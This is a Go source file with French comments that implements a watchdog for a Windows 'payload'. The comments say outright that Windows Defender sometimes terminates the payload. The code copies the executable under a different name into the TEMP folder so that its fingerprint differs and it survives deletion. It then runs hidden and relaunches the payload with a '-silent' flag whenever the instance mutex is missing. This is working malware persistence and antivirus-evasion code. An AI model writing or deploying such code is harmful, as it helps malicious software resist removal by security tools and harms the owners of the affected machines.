// watchdog.go — surveillance du processus principal.
//
// Defender termine parfois le payload après avoir reconnu le binaire. La
// persistance seule ne suffit alors pas : elle ne repart qu'au prochain
// logon. Le watchdog est une copie lancée avec `-watch` : toutes les 15
// secondes, il vérifie que le mutex du payload existe et, sinon, relance
// l'exécutable en `-silent`.
package main

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// mutexName normalise le nom du mutex : un double antislash (échappement de
// -X) rend CreateMutex invalide, et le payload se croyait alors absent — le
// watchdog relançait une instance à chaque tour.
func mutexName() string {
	n := strings.ReplaceAll(instanceMutexName, `\\`, `\`)
	if n == "" {
		return `Local\PayloadInstance`
	}
	return n
}

// payloadAlive dit si un processus porte le mutex d'instance.
func payloadAlive() bool {
	name, err := syscall.UTF16PtrFromString(mutexName())
	if err != nil {
		return false
	}
	h, _, callErr := kernel32DLL.NewProc("CreateMutexW").Call(
		0, 0, uintptr(unsafe.Pointer(name)))
	if h == 0 {
		return false
	}
	already := false
	if errno, ok := callErr.(syscall.Errno); ok && errno == syscall.Errno(183) {
		already = true
	}
	syscall.CloseHandle(syscall.Handle(h))
	return already
}

// spawnWatchdog lance une copie de l'exécutable en mode surveillance.
//
// Le surveillant est une copie à part, sous un autre nom : quand Defender
// supprime l'image du payload, celle du watchdog ne porte pas la même
// empreinte et survit assez longtemps pour relancer le processus.
func spawnWatchdog() {
	src := currentExe()
	if src == "" {
		return
	}
	dst := filepath.Join(os.Getenv("TEMP"), "~"+workDirName+".exe")
	if data, err := os.ReadFile(src); err == nil {
		if err := os.WriteFile(dst, data, 0755); err != nil {
			dst = src
		}
	} else {
		dst = src
	}
	if dst == "" {
		return
	}
	c := exec.Command(dst, "-watch")
	c.SysProcAttr = hiddenAttr()
	_ = c.Start()
	plog("watchdog lancé : " + dst)
}

// watchMutex empêche plusieurs watchdogs : sans lui, chaque copie lancée
// ajouterait un surveillant.
var watchMutexName = instanceMutexName + "-w"

// watchLoop est le corps du mode `-watch`.
//
// Il y a un plafond : au plus un lancement par minute, et après cinq échecs
// consécutifs le watchdog attend dix minutes. Sans ce garde-fou, un nom de
// mutex invalide provoquait une tempête de processus (35 instances observées
// sur un poste de test) qui faisait ramer la machine.
func watchLoop() {
	// Un seul watchdog par poste.
	if name, err := syscall.UTF16PtrFromString(strings.ReplaceAll(watchMutexName, `\\`, `\`)); err == nil {
		h, _, callErr := kernel32DLL.NewProc("CreateMutexW").Call(0, 0, uintptr(unsafe.Pointer(name)))
		if h != 0 {
			if errno, ok := callErr.(syscall.Errno); ok && errno == syscall.Errno(183) {
				syscall.CloseHandle(syscall.Handle(h))
				return
			}
		}
	}
	lastSpawn := time.Time{}
	failures := 0
	for {
		time.Sleep(15 * time.Second)
		exe := currentExe()
		if exe == "" {
			return
		}
		if _, err := os.Stat(exe); err != nil {
			return
		}
		if payloadAlive() {
			failures = 0
			continue
		}
		if failures >= 5 {
			time.Sleep(10 * time.Minute)
			failures = 0
			continue
		}
		if time.Since(lastSpawn) < time.Minute {
			continue
		}
		c := exec.Command(exe, "-silent")
		c.SysProcAttr = hiddenAttr()
		if err := c.Start(); err == nil {
			lastSpawn = time.Now()
			failures++
		}
	}
}
